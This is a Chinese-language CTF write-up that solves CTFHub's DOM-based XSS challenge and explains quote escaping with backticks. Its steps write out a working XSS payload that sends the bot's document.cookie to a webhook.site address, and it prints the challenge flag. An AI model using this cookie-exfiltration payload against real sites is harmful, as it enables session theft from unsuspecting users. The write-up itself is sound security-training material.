【CTFHub】Web-DOM反射XSS Writeup

操作者：何芊宏 | 操作日期：2026.9.21 | 分类：CTF | 标签：CTFHub, Web, XSS, DOM型, Webhook, OOB

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / DOM反射
  • 题目名称：DOM反射
  • 提示：页面提供修改文本的功能，输入内容后，前端JavaScript会将参数直接写入HTML。目标是通过前端逻辑触发XSS，外带Bot的Cookie。

2. 解题思路与知识点

DOM型XSS原理：服务器不参与处理恶意代码。前端JavaScript（如innerHTML、document.write）直接读取URL参数并写入页面，导致代码执行。属于前端自己处理不当导致的漏洞。

比喻说明：DOM型XSS就像是浏览器自己读了地址栏的小纸条，然后自己把毒药加到了页面里。

核心难点（引号冲突与逃逸）：靶场源码在渲染时，将我们的输入直接拼接到了一对单引号中间，形如 innerHTML = '...用户输入...';。

为了清晰地展示冲突原因，我在下文示范中使用颜色进行区分，颜色对应规则如下：

  • 红色：靶场源码自带的单引号（引发冲突的根源）。
  • 橙色：Payload中错误的单引号（导致闭合冲突）。
  • 绿色：Payload中成功的反引号（完美绕过冲突）。

3. 操作步骤

第一步：探测与基础弹窗

在 Change text 输入框输入测试代码，验证漏洞：

<img src=x onerror=alert(1)>

点击Submit，成功弹窗。说明 innerHTML 允许执行我们的标签。

第二步：尝试外带Payload

尝试使用常规的单引号Payload（错误示范）：

<img src=x onerror="new Image().src='https://webhook.site/.../?cookie='+document.cookie">

此时源码实际变成：innerHTML = ''<img src=x onerror="new Image().src='https://...'...>'';

结果：网页无任何反应，Webhook也没有收到请求。因为Payload里自带的单引号与靶场源码前方的红色单引号提前闭合，导致JS报错截断，后续代码无法执行。

第三步：修正Payload并成功外带（成功阶段）

将单引号替换为反引号（正确示范）：

<img src=x onerror="new Image().src=`https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?cookie=`+document.cookie">

此时源码实际变成：innerHTML = ''<img src=x onerror="new Image().src=`...`...">'';

反引号是JavaScript的模板字符串，不会与外层的单引号冲突。提交后，复制浏览器地址栏生成的完整URL，粘贴至 Send URL to Bot，点击Send。

第四步：捕获Flag

返回Webhook.site，等待数秒。在INBOX列表中找到最新请求，提取出Flag：

ctfhub{20b8c6c9e93d93b112cb86b9}

提交至CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：引号闭合冲突。前端把用户输入拼进了单引号里，我们自己又带单引号，导致代码截断。解决办法是用反引号替换。
  • 坑2：忽略了DOM型与反射型的区别。DOM型的数据不回传服务器，每次测试后必须重新输入，且前端JS报错不会有任何友好的报错提示，只能靠F12排查。
  • 坑3：正确找代码的方式。不要在Sources面板全局搜 test/a 等通用词，会搜出大量无关的前端库代码。应该直接找到最核心的“index.html”，搜索 location 或 innerHTML 等关键字。

5. 知识总结

  • DOM型XSS漏洞原理：不需要服务器解析Payload，完全由前端JavaScript处理URL参数并渲染至页面。参数通常在 location.search 或 location.hash 中。
  • 引号逃逸技巧：
    1. 外层是单引号 '，内层用双引号 " 或反引号 `。
    2. 外层是双引号 "，内层用单引号 ' 或反引号 `。
    3. 反引号（模板字符串）是Payload编写时规避引号冲突的万金油。
  • 外带Payload拆解复习：new Image().src=`Webhook地址/?cookie=`+document.cookie，使用隐形图片加载来悄悄发送GET请求。
